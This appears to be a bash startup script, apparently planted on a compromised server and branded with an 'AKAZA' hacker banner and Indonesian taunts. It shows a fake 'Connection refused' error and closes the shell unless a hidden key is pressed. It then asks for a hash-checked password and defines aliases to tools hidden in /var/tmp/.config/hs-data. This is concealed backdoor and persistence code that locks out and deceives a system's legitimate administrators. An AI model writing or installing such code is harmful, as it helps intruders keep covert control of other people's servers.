echo "Tue Jan 20 15:01:17 2026 [ID=1] Connection refused (no server listening) (2)"  
echo  
echo -e "\e[1;32m[Bye]\e[0m"  
  
# Tunggu 1 tombol maksimal 4 detik  
if read -rsn1 -t 4 key; then  
    # Jika tombol ditekan  
    [[ "$key" != "6" ]] && exit 0  
else  
    # Timeout 4 detik (tidak tekan apa pun)  
    exit 0  
fi  
  
clear  
  
  
case $- in  
    *i*) ;;  
    *) return ;;  
esac  
  
trap 'echo -e "\n\e[1;31m[!] Santai bang\e[0m\n"; continue' INT  
  
expected_hash="7e8e3ced0673089c6ede20c05136a083de49ac803bac9174d1d95b169dc08d82"  
input_hash=""  
  
echo -e "\e[1;36m======================================\e[0m"  
echo -e "   \e[1;33mSELAIN ETMIN DILARANG MASUK !!!!\e[0m"  
echo -e "\e[1;36m                  ↓↓↓                   \e[0m"  
echo -e "\e[1;35m  IM ! :\e[0m \e[1;36mH E R E !\e[0m"  
echo -e "\e[1;36m======================================\e[0m"  
  
while [[ "$input_hash" != "$expected_hash" ]]; do  
    echo -ne "\e[1;36m[+] Kalo gatau password nya tidur aja deks : \e[0m"  
    read -s input_pass  
    echo  
    input_hash=$(echo -n "$input_pass" | sha256sum | awk '{print $1}')  
      
    if [[ "$input_hash" != "$expected_hash" ]]; then  
        echo -e "\e[1;31m[!] MAU NGAPAIN DEK ? PERGI JAUH JAUH SANA DEK !\e[0m"  
    fi  
done  
  
echo -e "\n\e[1;32m[SUCCESS] AKSES DITERIMA Tuan Akaza !\e[0m"  
sleep 1  
  
logo='  
  
 █████╗ ██╗  ██╗ █████╗ ███████╗ █████╗  
██╔══██╗██║ ██╔╝██╔══██╗╚══███╔╝██╔══██╗  
███████║█████╔╝ ███████║  ███╔╝ ███████║  
██╔══██║██╔═██╗ ██╔══██║ ███╔╝  ██╔══██║  
██║  ██║██║  ██╗██║  ██║███████╗██║  ██║  
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  
'  
  
echo -e "\e[1;35m$logo\e[0m"  
echo -e "\e[1;36m======================================\e[0m"  
echo -e "      \e[1;33mSelamat Datang Tuan AKAZA \e[0m \e[1;35m👾\e[0m"  
echo -e "\e[1;33m   Siap Melayani Perintah Tuan AKAZA !"  
echo -e "\e[1;36m======================================\e[0m"  
echo  
  
timenow=$(date +'%H:%M')  
load=$(awk '{print $1 ", " $2 ", " $3}' /proc/loadavg)  
  
echo -e "\e[1;36mThe time now is $timenow UTC\e[0m"  
echo -e "\e[1;36mServer load: $load\e[0m"  
echo -e ""  
  
trap - INT  
alias hsocket='bash /var/tmp/.config/hs-data/hsocket'; alias hsfm='bash /var/tmp/.config/hs-data/hsfm'  